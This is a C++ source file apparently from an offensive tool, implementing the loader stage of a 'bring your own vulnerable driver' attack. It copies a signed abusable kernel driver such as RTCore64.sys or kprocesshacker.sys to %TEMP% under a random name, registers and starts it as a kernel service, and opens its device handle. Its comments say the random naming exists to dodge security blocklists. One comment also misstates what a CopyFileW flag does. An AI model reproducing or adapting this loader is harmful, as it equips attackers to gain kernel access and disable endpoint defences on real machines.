// =============================================================================
// DriverLoader.cpp - SCM lifecycle around a third-party signed kernel driver
// =============================================================================
//
// The full sequence each LoadDriver call performs:
//
//   1. Generate a random ASCII name for the service AND the on-disk copy.
//      A hardcoded "RTCore64" or "kprocesshacker" name is the first thing
//      every blocklist matches on.
//
//   2. Copy sourceSysPath -> %TEMP%\<rand>.sys. Authenticode signatures
//      survive a file copy unchanged - the signature is embedded in the
//      PE's certificate table, not the filesystem metadata.
//
//   3. OpenSCManager with SC_MANAGER_ALL_ACCESS. This requires admin -
//      caller responsibility. We don't try to elevate.
//
//   4. CreateServiceW with SERVICE_KERNEL_DRIVER + SERVICE_DEMAND_START
//      pointing at the temp path. The service ENTRY in the registry
//      tells the I/O manager where the .sys is; the service name in
//      the SCM is what we'll use to start/stop.
//
//   5. StartServiceW. The kernel verifies the .sys's Authenticode
//      signature against the trusted root chain at this point. If
//      verification fails, the service stays in STOPPED state and
//      StartServiceW returns ERROR_DRIVER_BLOCKED (1275) or
//      ERROR_INVALID_IMAGE_HASH (577).
//
//   6. CreateFileW on \\.\<deviceName> to get a handle the IOCTL layer
//      can talk to. The driver's DriverEntry is what created the device
//      object; deviceName is determined by the driver's source code, not
//      by us. (For kprocesshacker.sys: \\.\KProcessHacker3 ;
//      for RTCore64.sys: \\.\RTCore64.)
//
// Failure handling: every step that "succeeds halfway" is rolled back by
// UnloadDriver. We never assume a clean slate - the SCM might have a
// stale registration from a prior aborted run, in which case we'll get
// ERROR_SERVICE_EXISTS and have to either OpenServiceW the existing one
// or pick a different random name.
// =============================================================================

#include "../include/DriverLoader.h"

#include <windows.h>
#include <bcrypt.h>
#include <cstdio>
#include <cstring>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace ENI::Byovd {

namespace {

// Generate 8 hex chars of randomness. We want a name that's unique per
// invocation but readable in case we need to debug what's left over in
// SCM after a crash.
std::wstring RandomTag() {
    unsigned char raw[4]{};
    BCryptGenRandom(nullptr, raw, sizeof(raw),
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    wchar_t buf[16];
    swprintf_s(buf, L"%02x%02x%02x%02x",
               raw[0], raw[1], raw[2], raw[3]);
    return buf;
}

// %TEMP%\eni_drv_<tag>.sys
std::wstring MakeTempSysPath(const std::wstring& tag) {
    wchar_t tmpDir[MAX_PATH];
    DWORD n = GetTempPathW(MAX_PATH, tmpDir);
    if (n == 0 || n > MAX_PATH) return L"";
    std::wstring out = tmpDir;
    out += L"eni_drv_";
    out += tag;
    out += L".sys";
    return out;
}

bool CopyFileSafely(const std::wstring& src, const std::wstring& dst) {
    // FALSE for fail-if-exists - we picked a random destination, an
    // existing file at that path is something we shouldn't clobber.
    return CopyFileW(src.c_str(), dst.c_str(), FALSE) != 0;
}

// SCM service creation - shared between LoadDriver paths.
SC_HANDLE CreateKernelService(SC_HANDLE scm,
                              const std::wstring& name,
                              const std::wstring& binPath) {
    return CreateServiceW(
        scm,
        name.c_str(),                  // service name (key under SCM)
        name.c_str(),                  // display name (same is fine)
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        binPath.c_str(),
        nullptr,                       // no load-order group
        nullptr,                       // no tag id
        nullptr,                       // no dependencies
        nullptr,                       // run as LocalSystem
        nullptr);                      // no password
}

bool StartKernelService(SC_HANDLE svc) {
    if (StartServiceW(svc, 0, nullptr)) return true;
    DWORD err = GetLastError();
    // ALREADY_RUNNING is fine - means a previous load is still up,
    // we just attach to it.
    if (err == ERROR_SERVICE_ALREADY_RUNNING) return true;
    SetLastError(err);
    return false;
}

bool StopKernelService(SC_HANDLE svc) {
    SERVICE_STATUS status{};
    if (!ControlService(svc, SERVICE_CONTROL_STOP, &status)) {
        DWORD err = GetLastError();
        // NOT_ACTIVE is the success state for our cleanup purposes.
        if (err != ERROR_SERVICE_NOT_ACTIVE) return false;
    }
    // Best-effort wait for STOPPED. Some drivers take a moment to
    // tear down their device objects.
    for (int i = 0; i < 20; ++i) {
        if (!QueryServiceStatus(svc, &status)) break;
        if (status.dwCurrentState == SERVICE_STOPPED) break;
        Sleep(50);
    }
    return true;
}

} // namespace

DriverHandle LoadDriver(const std::wstring& sourceSysPath,
                        const std::wstring& deviceName) {
    DriverHandle h;

    if (GetFileAttributesW(sourceSysPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return h;
    }

    // 1. Random tag
    const std::wstring tag = RandomTag();
    if (tag.empty()) return h;

    h.serviceName = L"EniDrv_" + tag;
    h.tempSysPath = MakeTempSysPath(tag);
    if (h.tempSysPath.empty()) return h;

    // 2. Copy the signed .sys to %TEMP%
    if (!CopyFileSafely(sourceSysPath, h.tempSysPath)) {
        DWORD err = GetLastError();
        h.tempSysPath.clear();   // nothing to scrub
        SetLastError(err);
        return h;
    }

    // 3. Open SCM
    h.scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!h.scm) {
        DWORD err = GetLastError();
        DeleteFileW(h.tempSysPath.c_str());
        h.tempSysPath.clear();
        SetLastError(err);
        return h;
    }

    // 4. Register service
    h.service = CreateKernelService(h.scm, h.serviceName, h.tempSysPath);
    if (!h.service) {
        DWORD err = GetLastError();
        // If the random tag already collided (cosmically unlikely) we
        // could OpenServiceW and reuse. Just bail - the caller can
        // retry; it's deterministic only at the SCM level, not us.
        UnloadDriver(h);
        SetLastError(err);
        return h;
    }

    // 5. Start it
    if (!StartKernelService(h.service)) {
        DWORD err = GetLastError();
        UnloadDriver(h);
        SetLastError(err);
        return h;
    }
    h.weStarted = true;

    // 6. Open the device. The driver's DeviceObject was created during
    // its DriverEntry; we just need a handle to it.
    h.device = CreateFileW(
        deviceName.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    if (h.device == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        UnloadDriver(h);
        SetLastError(err);
        return h;
    }

    return h;
}

void UnloadDriver(DriverHandle& h) {
    if (h.device != INVALID_HANDLE_VALUE) {
        CloseHandle(h.device);
        h.device = INVALID_HANDLE_VALUE;
    }
    if (h.service) {
        if (h.weStarted) {
            StopKernelService(h.service);
        }
        DeleteService(h.service);   // removes the SCM registration
        CloseServiceHandle(h.service);
        h.service = nullptr;
    }
    if (h.scm) {
        CloseServiceHandle(h.scm);
        h.scm = nullptr;
    }
    if (!h.tempSysPath.empty()) {
        // Best-effort. If the kernel still holds the file image (the
        // driver is unloading async) the delete may fail - retry a few
        // times, then give up; the file is in %TEMP% and Windows will
        // garbage-collect it eventually.
        for (int i = 0; i < 10; ++i) {
            if (DeleteFileW(h.tempSysPath.c_str())) break;
            if (GetLastError() == ERROR_FILE_NOT_FOUND) break;
            Sleep(100);
        }
        h.tempSysPath.clear();
    }
    h.serviceName.clear();
    h.weStarted = false;
}

} // namespace ENI::Byovd
